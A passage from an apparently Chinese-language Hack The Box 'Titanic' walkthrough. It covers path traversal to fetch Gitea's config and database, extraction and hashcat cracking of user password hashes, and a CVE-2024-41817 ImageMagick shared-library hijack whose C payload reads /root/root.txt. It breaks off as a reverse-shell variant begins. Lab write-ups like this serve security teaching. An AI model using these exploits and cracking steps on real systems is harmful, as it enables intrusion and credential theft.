(<span class="hljs-title">admin</span>):/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">gnats</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">nobody:x</span>:65534:65534:<span class="hljs-title">nobody</span>:/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">_apt:x</span>:100:65534::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">network:x</span>:101:102:<span class="hljs-title">systemd</span> <span class="hljs-title">Network</span> <span class="hljs-title">Management</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">resolve:x</span>:102:103:<span class="hljs-title">systemd</span> <span class="hljs-title">Resolver</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">messagebus:x</span>:103:104::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">timesync:x</span>:104:105:<span class="hljs-title">systemd</span> <span class="hljs-title">Time</span> <span class="hljs-title">Synchronization</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">pollinate:x</span>:105:1::/<span class="hljs-title">var</span>/<span class="hljs-title">cache</span>/<span class="hljs-title">pollinate</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">sshd:x</span>:106:65534::/<span class="hljs-title">run</span>/<span class="hljs-title">sshd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">syslog:x</span>:107:113::/<span class="hljs-title">home</span>/<span class="hljs-title">syslog</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">uuidd:x</span>:108:114::/<span class="hljs-title">run</span>/<span class="hljs-title">uuidd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">tcpdump:x</span>:109:115::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">tss:x</span>:110:116:<span class="hljs-title">TPM</span> <span class="hljs-title">software</span> <span class="hljs-title">stack</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">tpm</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">landscape:x</span>:111:117::/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">landscape</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">fwupd</span>-<span class="hljs-title">refresh:x</span>:112:118:<span class="hljs-title">fwupd</span>-<span class="hljs-title">refresh</span> <span class="hljs-title">user</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">usbmux:x</span>:113:46:<span class="hljs-title">usbmux</span> <span class="hljs-title">daemon</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">usbmux</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">developer:x</span>:1000:1000:<span class="hljs-title">developer</span>:/<span class="hljs-title">home</span>/<span class="hljs-title">developer</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">lxd:x</span>:999:100::/<span class="hljs-title">var</span>/<span class="hljs-title">snap</span>/<span class="hljs-title">lxd</span>/<span class="hljs-title">common</span>/<span class="hljs-title">lxd</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">dnsmasq:x</span>:114:65534:<span class="hljs-title">dnsmasq</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">misc</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">_laurel:x</span>:998:998::/<span class="hljs-title">var</span>/<span class="hljs-title">log</span>/<span class="hljs-title">laurel</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br></code></pre></td></tr></table></figure><p>有 <code>developer</code>  用户</p><p><code>docker-compose.yml</code> 文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gitea:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">gitea/gitea</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">gitea</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;127.0.0.1:3000:3000&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;127.0.0.1:2222:22&quot;</span>  <span class="hljs-comment"># Optional for SSH access</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">/home/developer/gitea/data:/data</span> <span class="hljs-comment"># Replace with your path</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">USER_UID=1000</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">USER_GID=1000</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1752ede4d753a45e.png"></p><p>通过 <code>gitea</code> 的手册找到配置文件路径，结合 <code>docker-compose.yml</code>  中的文件路径下载配置文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini<br></code></pre></td></tr></table></figure><p>读取配置文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y/Downloads]<br>└─# cat _.._.._home_developer_gitea_data_gitea_conf_app.ini<br>APP_NAME = Gitea: Git with a cup of tea<br>RUN_MODE = prod<br>RUN_USER = git<br>WORK_PATH = /data/gitea<br><br>[repository]<br>ROOT = /data/git/repositories<br><br>[repository.local]<br>LOCAL_COPY_PATH = /data/gitea/tmp/local-repo<br><br>[repository.upload]<br>TEMP_PATH = /data/gitea/uploads<br><br>[server]<br>APP_DATA_PATH = /data/gitea<br>DOMAIN = gitea.titanic.htb<br>SSH_DOMAIN = gitea.titanic.htb<br>HTTP_PORT = <span class="hljs-number">3000</span><br>ROOT_URL = http://gitea.titanic.htb/<br>DISABLE_SSH = false<br>SSH_PORT = <span class="hljs-number">22</span><br>SSH_LISTEN_PORT = <span class="hljs-number">22</span><br>LFS_START_SERVER = true<br>LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4<br>OFFLINE_MODE = true<br><br>[database]<br><span class="hljs-built_in">PATH</span> = /data/gitea/gitea.db<br>DB_TYPE = sqlite3<br>HOST = localhost:<span class="hljs-number">3306</span><br>NAME = gitea<br>USER = root<br>PASSWD =<br>LOG_SQL = false<br>SCHEMA =<br>SSL_MODE = disable<br><br>[indexer]<br>ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve<br><br>[session]<br>PROVIDER_CONFIG = /data/gitea/sessions<br>PROVIDER = file<br><br>[picture]<br>AVATAR_UPLOAD_PATH = /data/gitea/avatars<br>REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars<br><br>[attachment]<br><span class="hljs-built_in">PATH</span> = /data/gitea/attachments<br><br>[log]<br><span class="hljs-built_in">MODE</span> = console<br>LEVEL = info<br>ROOT_PATH = /data/gitea/log<br><br>[security]<br>INSTALL_LOCK = true<br>SECRET_KEY =<br>REVERSE_PROXY_LIMIT = <span class="hljs-number">1</span><br>REVERSE_PROXY_TRUSTED_PROXIES = *<br>INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8<br>PASSWORD_HASH_ALGO = pbkdf2<br><br>[service]<br>DISABLE_REGISTRATION = false<br>REQUIRE_SIGNIN_VIEW = false<br>REGISTER_EMAIL_CONFIRM = false<br>ENABLE_NOTIFY_MAIL = false<br>ALLOW_ONLY_EXTERNAL_REGISTRATION = false<br>ENABLE_CAPTCHA = false<br>DEFAULT_KEEP_EMAIL_PRIVATE = false<br>DEFAULT_ALLOW_CREATE_ORGANIZATION = true<br>DEFAULT_ENABLE_TIMETRACKING = true<br>NO_REPLY_ADDRESS = noreply.localhost<br><br>[lfs]<br><span class="hljs-built_in">PATH</span> = /data/git/lfs<br><br>[mailer]<br>ENABLED = false<br><br>[openid]<br>ENABLE_OPENID_SIGNIN = true<br>ENABLE_OPENID_SIGNUP = true<br><br>[cron.update_checker]<br>ENABLED = false<br><br>[repository.pull-request]<br>DEFAULT_MERGE_STYLE = merge<br><br>[repository.signing]<br>DEFAULT_TRUST_MODEL = committer<br><br>[oauth2]<br>JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5ccf2c79c20f6a7a.png"></p><p>找到了 <code>gitea.db</code> 的路径 </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">PATH</span> = /data/gitea/gitea.db<br></code></pre></td></tr></table></figure><p>curl 下来</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">curl --<span class="hljs-built_in">path</span>-as-is -o gitea.db http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db<br></code></pre></td></tr></table></figure><p>查询一下数据库内容</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/gitea]<br>└─# sqlite3 gitea.db &quot;SELECT name, passwd, salt FROM user;&quot;<br>administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|<span class="hljs-number">2</span>d149e5fbd1b20cf31db3e3c6a28fc9b<br>developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|<span class="hljs-number">8</span>bf3e3452b78544f8bee9400d6936d34<br>joe|e8b6651ada9f663eb58fe9f91749e25ebb701ce68d8af03e41254d9b4cfa3a959db6dd4fe8b0928c4bfe0a2648fe0f7ccfc8|<span class="hljs-number">1626</span>a36ea942a7d1b34f06b23e2d89e7<br><span class="hljs-number">1</span>syn1|<span class="hljs-number">9</span>fbfa80ae243bacab37c5e10c2b8558f18bf3bc17b23d782a55d795143714e1ed87f9cc01422a6c5519e649a9e20783c7be9|bda65bd7bb76331c2076c23347cd156d<br>kilobyte|<span class="hljs-number">98</span>d6a67dd155352c962c26c0008412960e3130d64e1fd23514e2ae8059930457b05989e64eb6c5418b1f8bf6c27b47431ab8|<span class="hljs-number">216</span>d42075eef581be952be3a31bfd58d<br></code></pre></td></tr></table></figure><p>把内容转为 hashcat 能爆破的格式</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">sqlite3 gitea.db &quot;SELECT passwd, salt, name FROM user&quot; | awk -F &#x27;|&#x27; &#x27;&#123;<span class="hljs-built_in">cmd</span> = &quot;<span class="hljs-built_in">echo</span> -n &quot; $<span class="hljs-number">1</span> &quot; | xxd -r -p | base64&quot;; <span class="hljs-built_in">cmd</span> | getline digest; close(<span class="hljs-built_in">cmd</span>);<span class="hljs-built_in">cmd</span> = &quot;<span class="hljs-built_in">echo</span> -n &quot; $<span class="hljs-number">2</span> &quot; | xxd -r -p | base64&quot;; <span class="hljs-built_in">cmd</span> | getline salt; close(<span class="hljs-built_in">cmd</span>);printf &quot;<span class="hljs-variable">%s:sha256:50000:%</span>s:%s\n&quot;, $<span class="hljs-number">3</span>, salt, digest;&#125;&#x27; | tee gitea.hashes<br></code></pre></td></tr></table></figure><p>如下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">administrator:<span class="hljs-title">sha256</span>:50000:<span class="hljs-title">LRSeX70bIM8x2z48aij8mw</span>==:<span class="hljs-title">y6IMz5J9OtBWe2gWFzLT</span>+8<span class="hljs-title">oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY</span>=</span><br><span class="hljs-function"><span class="hljs-title">developer:sha256</span>:50000:<span class="hljs-title">i</span>/<span class="hljs-title">PjRSt4VE</span>+<span class="hljs-title">L7pQA1pNtNA</span>==:5<span class="hljs-title">THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO</span>/<span class="hljs-title">F2</span>+8<span class="hljs-title">wvxaCYZJjRE6llM</span>+1<span class="hljs-title">Y</span>=</span><br><span class="hljs-function"><span class="hljs-title">joe:sha256</span>:50000:<span class="hljs-title">FiajbqlCp9GzTwayPi2J5w</span>==:6<span class="hljs-title">LZlGtqfZj61j</span>+<span class="hljs-title">n5F0niXrtwHOaNivA</span>+<span class="hljs-title">QSVNm0z6OpWdtt1P6LCSjEv</span>+<span class="hljs-title">CiZI</span>/<span class="hljs-title">g98z8g</span>=</span><br><span class="hljs-function">1<span class="hljs-title">syn1:sha256</span>:50000:<span class="hljs-title">vaZb17t2MxwgdsIzR80VbQ</span>==:<span class="hljs-title">n7</span>+<span class="hljs-title">oCuJDusqzfF4QwrhVjxi</span>/<span class="hljs-title">O8F7I9eCpV15UUNxTh7Yf5zAFCKmxVGeZJqeIHg8e</span>+<span class="hljs-title">k</span>=</span><br><span class="hljs-function"><span class="hljs-title">kilobyte:sha256</span>:50000:<span class="hljs-title">IW1CB17vWBvpUr46Mb</span>/<span class="hljs-title">VjQ</span>==:<span class="hljs-title">mNamfdFVNSyWLCbAAIQSlg4xMNZOH9I1FOKugFmTBFewWYnmTrbFQYsfi</span>/<span class="hljs-title">bCe0dDGrg</span>=</span><br></code></pre></td></tr></table></figure><p>爆破得到密码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/601fbb69c73422e8.png"></p><p>developer 密码就是 <code>25282528</code>，ssh 登录拿到 userflag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-number">8</span>fd2b6d8b3295ff48e360a3b4ee855ed<br></code></pre></td></tr></table></figure><h1 id="RootFlag"><a href="#RootFlag" class="headerlink" title="RootFlag"></a>RootFlag</h1><p>查看一下进程</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">developer@titanic:~$ <span class="hljs-title">ps</span> <span class="hljs-title">aux</span></span><br><span class="hljs-function"><span class="hljs-title">USER</span>         <span class="hljs-title">PID</span> %<span class="hljs-title">CPU</span> %<span class="hljs-title">MEM</span>    <span class="hljs-title">VSZ</span>   <span class="hljs-title">RSS</span> <span class="hljs-title">TTY</span>      <span class="hljs-title">STAT</span> <span class="hljs-title">START</span>   <span class="hljs-title">TIME</span> <span class="hljs-title">COMMAND</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+    1174 24.5  0.9 1065140 36656 ?       <span class="hljs-title">Ssl</span>  11:27  14:40 /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">python3</span> /<span class="hljs-title">opt</span>/<span class="hljs-title">app</span>/<span class="hljs-title">app.py</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+    2553  5.1  4.7 1542860 187236 ?      <span class="hljs-title">Ssl</span>  11:27   3:03 /<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">gitea</span> <span class="hljs-title">web</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+   97125  0.0  0.2  17072  9888 ?        <span class="hljs-title">Ss</span>   11:32   0:00 /<span class="hljs-title">lib</span>/<span class="hljs-title">systemd</span>/<span class="hljs-title">systemd</span> --<span class="hljs-title">user</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+   97635  0.0  0.1   8788  5564 <span class="hljs-title">pts</span>/0    <span class="hljs-title">Ss</span>+  11:32   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  391153  0.0  0.1   8788  5564 <span class="hljs-title">pts</span>/1    <span class="hljs-title">Ss</span>+  11:58   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  489859  0.0  0.1   8656  5412 <span class="hljs-title">pts</span>/2    <span class="hljs-title">Ss</span>+  12:09   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  513995  0.0  0.1   8656  5440 <span class="hljs-title">pts</span>/3    <span class="hljs-title">Ss</span>   12:11   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  578623  0.0  0.1   8788  5536 <span class="hljs-title">pts</span>/5    <span class="hljs-title">Ss</span>+  12:17   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  674578  0.0  0.0  10072  1548 <span class="hljs-title">pts</span>/3    <span class="hljs-title">R</span>+   12:26   0:00 <span class="hljs-title">ps</span> <span class="hljs-title">aux</span></span><br></code></pre></td></tr></table></figure><p>可以看到 <code>/opt/app/app.py</code>  消耗了大量 CPU 资源，在 <code>/opt/scripts</code> 下找到了 <code>identify_images.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /opt/app/static/assets/images<br><span class="hljs-built_in">truncate</span> -s 0 metadata.log<br>find /opt/app/static/assets/images/ -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.jpg&quot;</span> | xargs /usr/bin/magick identify &gt;&gt; metadata.log<br></code></pre></td></tr></table></figure><p>查看了一下日志文件，emmm没啥东西</p><p><img src="https://img.dkdun.cn/v1/2025/12/87487133510886ea.png"></p><p>搜了一下  <code>/usr/bin</code> 下的 <code>magick identify</code>，它是 <code>ImageMagic</code> 的命令行工具，&#96;&#96;ImageMagic&#96; 是一个用于查看、编辑位图文件以及进行图像格式转换的软件</p><p><img src="https://img.dkdun.cn/v1/2025/12/f43e4168641fd65e.png"></p><p>查看版本号</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">developer@titanic:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>$ <span class="hljs-title">magick</span> --<span class="hljs-title">version</span></span><br><span class="hljs-function"><span class="hljs-title">Version</span>: <span class="hljs-title">ImageMagick</span> 7.1.1-35 <span class="hljs-title">Q16</span>-<span class="hljs-title">HDRI</span> <span class="hljs-title">x86_64</span> 1<span class="hljs-title">bfce2a62</span>:20240713 <span class="hljs-title">https</span>://<span class="hljs-title">imagemagick.org</span></span><br><span class="hljs-function"><span class="hljs-title">Copyright</span>: (<span class="hljs-title">C</span>) 1999 <span class="hljs-title">ImageMagick</span> <span class="hljs-title">Studio</span> <span class="hljs-title">LLC</span></span><br><span class="hljs-function"><span class="hljs-title">License</span>: <span class="hljs-title">https</span>://<span class="hljs-title">imagemagick.org</span>/<span class="hljs-title">script</span>/<span class="hljs-title">license.php</span></span><br><span class="hljs-function"><span class="hljs-title">Features</span>: <span class="hljs-title">Cipher</span> <span class="hljs-title">DPC</span> <span class="hljs-title">HDRI</span> <span class="hljs-title">OpenMP</span>(4.5)</span><br><span class="hljs-function"><span class="hljs-title">Delegates</span> (<span class="hljs-title">built</span>-<span class="hljs-title">in</span>): <span class="hljs-title">bzlib</span> <span class="hljs-title">djvu</span> <span class="hljs-title">fontconfig</span> <span class="hljs-title">freetype</span> <span class="hljs-title">heic</span> <span class="hljs-title">jbig</span> <span class="hljs-title">jng</span> <span class="hljs-title">jp2</span> <span class="hljs-title">jpeg</span> <span class="hljs-title">lcms</span> <span class="hljs-title">lqr</span> <span class="hljs-title">lzma</span> <span class="hljs-title">openexr</span> <span class="hljs-title">png</span> <span class="hljs-title">raqm</span> <span class="hljs-title">tiff</span> <span class="hljs-title">webp</span> <span class="hljs-title">x</span> <span class="hljs-title">xml</span> <span class="hljs-title">zlib</span></span><br><span class="hljs-function"><span class="hljs-title">Compiler</span>: <span class="hljs-title">gcc</span> (9.4)</span><br></code></pre></td></tr></table></figure><p>查 CVE ，找到了 <a href="https://www.cve.org/CVERecord?id=CVE-2024-41817">CVE-2024-41817</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/7df3d39d6eeb0364.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/fd79ef6d97f2c20f.png"></p><p><code>AppImage</code> 版本 <code>ImageMagick</code> 在执行过程中设置 <code>MAGICK_CONFIGURE_PATH</code> 和 <code>LD_LIBRARY_PATH</code> 环境变量时可能会使用空路径，这可能会在执行 <code>ImageMagick</code> 时通过在当前工作目录中加载恶意配置文件或共享库导致任意代码执行，具体在 <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">CVE-2024-41817</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/05a892579621b41d.png"></p><p>在工作目录创建共享库，工作目录应该是 <code>/opt/app/static/assets/images/</code></p><p>总结：在  <code>shell</code> 文件中找到了工作目录，又因为在工作目录下会有任意代码执行的漏洞，所以我们可以直接通过在 poc 里面写入命令拿到 root</p><h2 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h2><p>将 <code>root/root.txt</code> 复制到当前目录来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;cp /root/root.txt root.txt;chmod 777 root.txt&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/4a4a8a5dd790330a.png"></p><p>拿到 rootflag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">24981e432</span>ecf<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">66462</span>da<span class="hljs-number">1</span>fa<span class="hljs-number">91</span>fff<span class="hljs-number">48</span>f<br></code></pre></td></tr></table></figure><h2 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h2><p>（这里是 SWDD 师傅的教学）可以发现 Machine 上有 python3，那么可以利用 poc 写反弹 shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span 